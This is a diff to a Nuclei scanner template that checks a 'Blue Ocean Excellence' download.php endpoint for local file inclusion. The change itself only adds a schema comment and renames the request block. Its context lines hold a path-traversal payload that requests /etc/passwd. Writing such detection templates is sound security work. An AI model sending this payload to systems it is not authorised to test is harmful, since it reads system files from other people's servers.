@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: blue-ocean-excellence-lfi
 
 info:
@@ -13,7 +14,7 @@ info:
     cwe-id: CWE-22
   tags: blue-ocean,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
